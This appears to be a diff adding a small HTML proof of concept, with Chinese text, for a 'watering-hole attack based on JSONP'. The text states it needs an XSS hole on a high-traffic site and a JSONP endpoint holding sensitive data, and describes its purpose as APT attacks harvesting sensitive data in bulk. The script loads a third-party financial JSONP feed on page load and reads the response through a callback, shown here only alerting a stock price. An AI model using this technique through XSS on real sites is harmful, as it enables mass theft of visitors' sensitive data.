@@ -1,0 +1,29 @@
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>基于jsonp的水坑攻击</title>
+    </head>
+    <body>
+        <div>
+            前提：<br>
+               <p> 1.你必须要有一个流量大的网站的xss漏洞</p>
+               <p> 2.使用jsonp的接口必须要有敏感数据，这样的攻击才有意义</p>
+            作用：<br>
+                <p>用于APT攻击，大批量获取敏感数据</p>
+        </div>
+        <script>
+            function addScriptTag(src){
+                var script = document.createElement('script');
+                script.setAttribute("type","text/javascript");
+                script.src = src;
+                document.body.appendChild(script);
+            }
+            function run(obj){
+                alert(obj['0000001'].price);
+            }
+            window.onload = ()=>{
+                addScriptTag("http://api.money.126.net/data/feed/0000001,1399001?callback=run")
+            }
+        </script>
+    </body>
+</html>
